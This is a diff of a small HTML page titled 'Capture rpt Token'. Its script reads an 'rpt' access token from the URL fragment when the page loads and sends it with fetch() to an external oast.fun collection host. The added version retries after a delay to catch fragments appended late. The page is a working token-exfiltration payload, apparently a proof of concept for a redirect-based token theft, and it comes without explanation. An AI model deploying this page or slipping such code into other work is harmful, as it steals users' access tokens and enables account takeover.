@@ -1,21 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Capture rpt Token</title>
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        // Check periodically in case the fragment is added after DOMContentLoaded
+        function tryCaptureToken() {
+          const fragment = window.location.hash.substring(1);
+          const params = new URLSearchParams(fragment);
+          const rptValue = params.get('rpt');
 
-<h1>Hello</h1>
+          if (rptValue) {
+            fetch(`https://nqnleaxpuqzmobxwudnxz3v7lw600hwce.oast.fun/?rpt=${encodeURIComponent(rptValue)}`);
+            return true;
+          }
+          return false;
+        }
 
-<script>
-window.onload = function () {
-  // Get the URL fragment (part after #)
-  const fragment = window.location.hash.substring(1);
-
-  // Parse fragment parameters
-  const params = new URLSearchParams(fragment);
-
-  // Get the 'rpt' parameter value
-  const rptValue = params.get('rpt');
-
-  if (rptValue) {
-    // Send it to the server
-    fetch(`https://nqnleaxpuqzmobxwudnxz3v7lw600hwce.oast.fun/?rpt=${encodeURIComponent(rptValue)}`);
-  }
-};
-
-</script>
+        // Run immediately
+        if (!tryCaptureToken()) {
+          // Try again after a short delay (some apps append fragment after load)
+          setTimeout(tryCaptureToken, 100);
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <h1>Hello</h1>
+  </body>
+</html>
